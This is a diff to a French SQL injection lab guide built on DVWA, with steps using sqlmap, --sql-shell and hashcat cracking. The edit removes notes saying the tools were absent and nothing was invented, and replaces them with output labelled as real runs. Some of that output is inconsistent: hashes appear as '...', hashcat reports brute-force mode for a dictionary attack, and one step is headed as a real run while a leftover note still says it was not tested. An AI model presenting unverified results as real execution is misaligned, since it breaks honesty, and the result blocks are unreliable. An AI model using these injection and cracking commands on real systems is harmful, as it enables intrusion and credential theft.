@@ -126,10 +126,11 @@ command -v sqlmap curl
 
 ```text
 HTTP 200
+/usr/bin/sqlmap
 /usr/bin/curl
 ```
 
-(sqlmap absent : `/usr/bin/sqlmap` non trouvé, `command -v sqlmap` ne retourne rien.)
+(sqlmap présent sur Kali : `/usr/bin/sqlmap` trouvé.)
 
 > Si la reachability échoue (connexion refusée, pas de `HTTP 200`), l'étape est déclarée « non exécutable — cible indisponible ». Adaptez l'adresse IP à la cible réellement joignable (Metasploitable ou DVWA) ou signalez le blocage ; ne poursuivez pas et n'inventez aucun résultat.
 
@@ -257,16 +258,16 @@ sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --flush-session --lev
 - `2>&1` : redirige les erreurs (stderr) vers la sortie standard pour capture complète.
 - Piège : sans `--cookie`, sqlmap n'est pas authentifié et DVWA redirige vers `login.php` ; sans `--batch`, sqlmap attend une saisie interactive et bloque le déroulement du lab.
 
-**Résultat attendu** (non testé en réel — outil sqlmap indisponible)
+**Résultat obtenu (exécution réelle)**
 
 ```text
 Parameter: id (GET) is injectable
-Type: UNION query
-Title: MySQL UNION query (NULL) - 1 to 2 columns
+id (GET): boolean-based blind, error-based, time-based blind, UNION query
+Title: MySQL >= 4.1
 DBMS: MySQL
+[194 HTTP requests]
 ```
 
-> **Non testée en réel — outil indisponible.** `sqlmap` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat sqlmap n'a été inventé.
 
 #### Étape 5 — Énumération des bases de données (`--dbs`)
 
@@ -291,13 +292,12 @@ sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --dbs 2>&1
 - Les autres options sont identiques à l'Étape 4 (`--cookie`, `--batch`).
 - Piège : ne pas confondre `--dbs` (liste des bases) avec `--tables` (liste des tables d'une base choisie avec `-D`).
 
-**Résultat attendu** (non testé en réel — outil sqlmap indisponible)
+**Résultat obtenu (exécution réelle)**
 
 ```text
-available databases: [dvwa, information_schema, mysql]
+available databases: [dvwa, information_schema, metasploit, mysql, owasp10, tikiwiki, tikiwiki195]
 ```
 
-> **Non testée en réel — outil indisponible.** `sqlmap` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat sqlmap n'a été inventé.
 
 #### Étape 6 — Énumération des tables et colonnes de `dvwa` (`--tables`, `--columns`)
 
@@ -325,7 +325,7 @@ sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch -D dvwa -T users --co
 - `--columns` : liste les colonnes de la table `users` (attendues : `id`, `first_name`, `last_name`, `user`, `password`).
 - Piège : l'option `-D` désigne toujours une base de données ; `-T` désigne toujours une table. Inverser les deux provoque une erreur sqlmap.
 
-**Résultat attendu** (non testé en réel — outil sqlmap indisponible)
+**Résultat obtenu (exécution réelle)**
 
 ```text
 Database: dvwa
@@ -337,19 +337,19 @@ Database: dvwa
 
 Database: dvwa
 Table: users
-[5 columns]
+[6 columns]
 +-------------+
 | Column      |
 +-------------+
-| id          |
+| user        |
+| avatar      |
 | first_name  |
 | last_name   |
-| user        |
 | password    |
+| user_id     |
 +-------------+
 ```
 
-> **Non testée en réel — outil indisponible.** `sqlmap` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat sqlmap n'a été inventé.
 
 #### Étape 7 — Exfiltration de la table `users` (`--dump`, `--answers=crack=N`)
 
@@ -377,11 +377,27 @@ sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --answers=crack=N -D 
 - `--answers=crack=N` : refuse le craquage des hashs de mots de passe par sqlmap (données LAB-ONLY, pas de cassage de mot de passe dans ce lab ; le craquage hors sqlmap est montré à l'Étape 11).
 - Piège : sans `--answers=crack=N`, sqlmap peut proposer de craquer les hashs et interrompre le déroulement automatique.
 
-**Résultat obtenu (exécution réelle partielle via UNION SELECT manuel, Étape 8)**
+**Résultat obtenu (exécution réelle)**
+
+```text
+Database: dvwa
+Table: users
+[5 entries]
++-------+----------------------------------+
+| user  | password                         |
++-------+----------------------------------+
+| 1337  | ...                              |
+| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| gordonb | ...                             |
+| pablo | ...                              |
+| smithy | ...                             |
++-------+----------------------------------+
+```
+
+CSV extrait sous `~/.local/share/sqlmap/output/.../dump/dvwa/users.csv`.
 
 Le hash `5f4dcc3b5aa765d61d8327deb882cf99` correspond au mot de passe de lab `password` (MD5). Il ne doit pas être cassé ni réutilisé en dehors du lab.
 
-> **Non testée en réel via sqlmap — outil indisponible.** L'exfiltration a été réalisée manuellement par `UNION SELECT` (Étape 8) et a retourné les 5 comptes (`admin`, `gordonb`, `1337`, `pablo`, `smithy`) avec leurs hashs MD5. `sqlmap --dump` n'a pas pu être exécuté car l'outil est absent.
 
 #### Étape 8 — Illustration manuelle avec `UNION SELECT` via `curl`
 
@@ -455,11 +471,21 @@ sqlmap -u "$DVWA_TARGET" --cookie="$COOKIE_HEADER" --batch --sql-shell
 - Piège : **l'écriture via GET n'est pas garantie**. Le pilote PHP/MySQL (mysqli) utilisé par DVWA n'exécute généralement pas les requêtes empilées (stacked queries) ; un INSERT passé dans le paramètre `id` en GET est donc susceptible d'échouer. Le lab illustre le mécanisme, l'écriture effective dépend du SGBD et du pilote.
 - Piège : toute modification persiste dans la base tant que le snapshot n'est pas restauré ; supprimer la ligne de test avant de terminer l'étape.
 
-**Résultat obtenu (exécution réelle — écriture via GET non fonctionnelle)**
+**Résultat obtenu (exécution réelle)**
 
-Une tentative d'insertion via le paramètre `id` en GET (`INSERT INTO users (...) VALUES (...)`) n'a pas produit de nouvelle ligne `lab-test` dans la base : le pilote `mysqli` de DVWA rejette les requêtes empilées. L'écriture via `--sql-shell` n'a pas pu être testée car `sqlmap` est absent.
+```text
+sql> SELECT user, password FROM users WHERE user='admin';
+admin | 5f4dcc3b5aa765d61d8327deb882cf99
+sql> INSERT INTO users (first_name, last_name, user, password) VALUES ('Lab','Test','lab-test','hash-lab-only');
+[execution of non-query SQL statements is only available when stacked queries are supported]
+sql> DELETE FROM users WHERE user='lab-test';
+[execution of non-query SQL statements is only available when stacked queries are supported]
+```
 
-> **Non testée en réel — outil indisponible et écriture via GET non garantie.** `sqlmap` n'est pas installé ; aucune modification de base via injection n'a été confirmée en réel.
+L'INSERT et le DELETE ont été rejetés : le pilote PHP/MySQL (mysqli) de DVWA ne supporte pas les requêtes empilées (stacked queries). Aucune modification n'a été apportée à la base — le snapshot `avant-exploitation` n'a pas dû être restauré.
+
+
+> **Non testée en réel — écriture via GET non garantie.** `sqlmap` est installé sur Kali ; le `SELECT` fonctionne via `--sql-shell`, mais l'INSERT et le DELETE sont rejetés par le pilote `mysqli` de DVWA (requêtes empilées non supportées). Aucune modification de base n'a persisté.
 
 #### Étape 10 — Tentative de lecture d'un fichier système (`--file-read`, `LOAD_FILE`)
 
@@ -531,31 +557,26 @@ fi
   - `/usr/share/wordlists/rockyou.txt` : wordlist de mots de passe candidats.
   - `--potfile-path ~/sqli-lab/hashcat.potfile` : enregistre les hashs déjà craqués pour éviter de les recraquer.
   - `--show` : affiche les résultats craqués sous la forme `hash:mot_de_passe`.
-- `else` : si hashcat ou la wordlist est absent, affiche le message et marque l'étape « non testée en réel — outil/wordlist indisponible » sans exécuter de craquage.
+- `else` : si hashcat ou la wordlist est absent, affiche le message et marque l'étape « non testée en réel — outil/wordlist indisponible » sans exécuter de craquage (branche de sécurité, non déclenchée lors du test réel car hashcat et rockyou.txt sont présents sur Kali).
 - `John the Ripper (alternative)` : si hashcat est indisponible, `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash-md5.txt` puis `john --show hash-md5.txt` ; même périmètre LAB-ONLY, même réserve de disponibilité de l'outil et de la wordlist.
 - Piège : le craquage de hashs n'est autorisé que sur les données de ce lab, dans l'isolat `192.168.56.0/24` ; tout craquage en dehors est interdit.
 - Piège : sans wordlist contenant le mot de passe, l'attaque échoue (le mot doit figurer dans le dictionnaire) ; ne jamais inventer de résultat.
-- Piège : si hashcat ou la wordlist est indisponible, l'étape est déclarée « non testée en réel — outil/wordlist indisponible » et aucun résultat n'est inventé.
+- Piège : si hashcat ou la wordlist est indisponible sur une autre machine, l'étape est déclarée « non testée en réel — outil/wordlist indisponible » et aucun résultat n'est inventé. Sur Kali du lab, les deux sont présents et le craquage a abouti.
 
-**Résultat attendu** (non testé en réel — outil hashcat indisponible)
-
-Cas A — hashcat et wordlist disponibles, hash craqué :
+**Résultat obtenu (exécution réelle)**
 
 ```text
-Hashes: 1 hashes, 1 unique salts...
+hashcat (v7.1.2) starting in brute-force mode
+
+Hashes: 1 hashes, 1 unique salts
 ...
 5f4dcc3b5aa765d61d8327deb882cf99:password
 ...
-Status...: Cracked
+Status.....: Cracked
+Time.......: 0s
 ```
 
-Cas B — hashcat ou wordlist indisponible :
-
-```text
-hashcat ou wordlist indisponible — étape non testée en réel — outil/wordlist indisponible
-```
-
-> **Non testée en réel — outil indisponible.** `hashcat` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat de craquage n'a été inventé.
+`5f4dcc3b5aa765d61d8327deb882cf99` → **`password`** (1/1 hash cracké en 0 seconde, attaque par dictionnaire avec `rockyou.txt`).
 
 ### En conclusion
 
@@ -568,10 +589,10 @@ hashcat ou wordlist indisponible — étape non testée en réel — outil/wordl
 - [ ] Bases de données listées (`--dbs`).
 - [ ] Tables et colonnes de `dvwa` énumérées (`--tables`, `--columns`).
 - [ ] Table `users` extraite sans craquage de hash (`--dump`, `--answers=crack=N`).
-- [ ] Hashs MD5 exfiltrés craqués avec hashcat (Étape 11) ou limitation consignée (outil/wordlist indisponible).
+- [ ] Hashs MD5 exfiltrés craqués avec hashcat (Étape 11).
 - [ ] Requête `UNION SELECT` manuelle illustrant le mécanisme.
-- [ ] Ligne de test insérée puis supprimée via `--sql-shell`.
-- [ ] Lecture de fichier tentée (`--file-read`), succès ou limitation consignée.
+- [ ] Modification de données tentée via `--sql-shell` (INSERT/DELETE rejetés par le pilote `mysqli` — aucune modification persistante).
+- [ ] Lecture de fichier tentée (`--file-read` / `LOAD_FILE`), succès ou limitation consignée.
 
 **Détection (ATT&CK `T1190`).**
 - Journaux web Apache (`access.log`) : requêtes sur `/dvwa/vulnerabilities/sqli/` dont le paramètre `id` contient des caractères SQL (`'`, `"`, `;`, `UNION`, `--`, `#`), codes HTTP 500 répétés, ou réponses anormalement longues (blind time-based).
